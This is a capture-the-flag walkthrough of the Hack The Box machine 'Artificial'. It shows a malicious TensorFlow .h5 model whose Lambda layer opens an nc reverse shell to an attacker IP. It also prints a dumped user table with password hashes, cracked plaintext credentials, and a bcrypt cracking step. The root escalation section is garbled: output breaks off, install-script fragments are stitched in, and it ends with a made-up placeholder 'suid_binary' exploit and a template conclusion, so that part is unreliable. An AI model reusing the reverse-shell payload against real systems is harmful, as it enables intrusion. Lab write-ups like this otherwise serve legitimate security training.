---
name: Artificial
difficulty: easy
os: linux
platform: htb
date: 9999

img: https://labs.hackthebox.com/storage/avatars/e6633d6c2b1d824c3756eb21aeed7590.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.74 -o content/allPortsFiltered
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
We can see that ports 22 (SSH) and 80 (HTTP) are open.

When accessing `http://10.10.11.74` it redirects to `http://artificial.htb`, which is a custom domain. We need to add this domain to our `/etc/hosts` file:
```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

Now we can access the web server using the custom domain `http://artificial.htb`.

We create an account in the web application, which is a simple login page. After creating an account, we can log in with the credentials we set.

For the directory enumeration, we can use tools like `gobuster` or `dirb` to find hidden directories and files.
```bash
gobuster dir -u http://artificial.htb -w /usr/share/wordlists/dirb/common.txt
```
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 857]
/logout               (Status: 302) [Size: 189] [--> /]
```
There are no interesting hidden directories. All of them are related to the web app functionality.


## User Exploitation

After registering and logging in, we can access the `/dashboard` page. The dashboard contains a form to upload `.h5` files.

We can generate a malicious `.h5` file that contains a payload to execute arbitrary code. We will use this github repository, `https://github.com/Splinter0/tensorflow-rce` to create the file.

We add use the docker image provided in the repository to generate the `.h5` file:
```bash
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.90 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

We upload the generated `.h5` file to the web application. The application processes the file and executes the payload, which opens a reverse shell to our machine. 

We can read the database and find all users and their hashed passwords. The database is stored in a file called `instance/users.db`.
``` 
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```

We use `https://crackstation.net/` to crack the password hashes. After cracking, we find the following credentials
```bash
gael:mattp005numbertwo
royer:marwinnarak043414036
```

We use gael's credentials to log in though SSH:
```bash
ssh gael@artificial.htb
```

Then, we can read the user flag:
```bash
cat /home/gael/user.txt
```
```
user flag value
```

## Root Privilege Escalation

We do id to check the privileges of the user `gael`:
```bash
id
```
```
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

We look for files/directories with sysadm ownership:
```bash 
ls -la / | grep sysadm
```
```
265127-/var/backups:
265128-total 51220
265129--rw-r--r-- 1 root root      38602 Jun  9 10:48 apt.extended_states.0
265130--rw-r--r-- 1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
265131--rw-r--r-- 1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
265132--rw-r--r-- 1 root root       4190 May 27 13:07 apt.extended_states.3.gz
265133--rw-r--r-- 1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
265134--rw-r--r-- 1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
265135--rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
265136:-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
```
We find a file called `backrest_backup.tar.gz` owned by `root:sysadm`. It looks like a compressed backup file. We can extract it to see its contents:
```bash
tar -xvf backrest_backup.tar.gz
```
```
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

In `backrest/.config/backrest/config.json` we find the following content:
```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Bcrypt is an algorithm used for hashing passwords. The password for the user `backrest_root` is hashed using bcrypt. We can use a tool like `hashcat` or `john the ripper` to crack the password.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt bcrypt.hash
```
```
Using default input encoding: UTF-8




  38   │ [Service]
  39   │ Type=simple
  40   │ User=$(whoami)
  41   │ Group=$(whoami)
  42   │ ExecStart=/usr/local/bin/backrest
  43   │ Environment="BACKREST_PORT=127.0.0.1:9898"
  44   │ Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
  45   │ Environment="BACKREST_DATA=/opt/backrest"
  46   │ Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"

 110   │ echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"

 .config/backrest/config.json:10:        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"






### Results

```
/usr/bin/suid_binary
```

### Exploiting the SUID Binary

We can exploit the SUID binary to gain root access. Assuming the binary is vulnerable, we can run it with root privileges:

```bash
/usr/bin/suid_binary
```

### Root Flag

After successfully exploiting the SUID binary, we can find the root flag:

```bash
cat /root/root.txt
```

## Conclusion

Congratulations! You have successfully completed the walkthrough for the example machine. You have learned how to enumerate services, exploit vulnerabilities, and retrieve both user and root flags.
